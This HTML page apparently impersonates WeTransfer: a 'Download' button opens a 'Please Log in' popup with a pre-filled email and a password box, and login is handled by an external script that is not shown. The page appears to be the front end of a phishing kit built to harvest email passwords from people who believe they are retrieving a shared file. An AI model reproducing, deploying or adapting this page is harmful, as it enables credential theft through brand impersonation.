<!DOCTYPE html>
<html lang='en-US'>

<head>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="/weTransferf.css" type="text/css"/> 
      <title>WeTransfer</title>
      <link rel="big icon" href="/imgd/favicon.ico" type="image/icon"/>
<link href='//fonts.googleapis.com/css?family=PT+Serif&amp;subset=latin%2Ccyrillic' media='all' rel='stylesheet' type='text/css'/>
<link href='//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css' rel='stylesheet'/>
<link href='http://fonts.googleapis.com/css?family=Dosis:400,700|Open+Sans:400,700,400italic|Exo+2:700' media='all' rel='stylesheet' type='text/css'/>
<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'/>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'></script>
<script type='text/javascript' src='/runsd.js'> </script> 





</head>


<body class='bodyy'>
    
  <div id='bckimg' ></div>  
  
<div id='btn-dwl'>  
<button class='btn' id='btnID' onclick='getLogin()' type='button' title='Download'> Download </button></div>

 
<!--  FORM POPUP  -->
<div id='login' height='100%' width='100%'>
    
<table height='100' width='400' style='border-radius:30px; background-color:white; font-size:20px; border:1px solid #1C0910; '>
<tr><td><h2 style='text-align: center;'>Please Log in</h2></td></tr>
<tr><td align='center'><strong>E-mail</strong></td></tr>
<tr><td align='center'><span id='emailTxt' ></span>  <br/>
     <input type='hidden' id='emailTxtF' size='15'/></td></tr>
     <tr><td align='center'><input id='passwordTxt' autocomplete='off' placeholder='enter password' type='password'  required/> <span id='pwErr' style='color:red;'></span><br/> </td></tr>
     <tr><td align='center'><div id='pwErrDiv'><span id='pwErr2'></span></div>
    <button class='btn' id='btnSgn' onclick='loginBox()' type='button' title='Login to start Download'>
        Login </button><br/> 
        
<div class='ldgLogs' id='ldgLogsID'> <i class='fa fa-spinner fa-spin' font='20'></i>  </div></td></tr>
    </table>    
</div>




</body> 
</html>
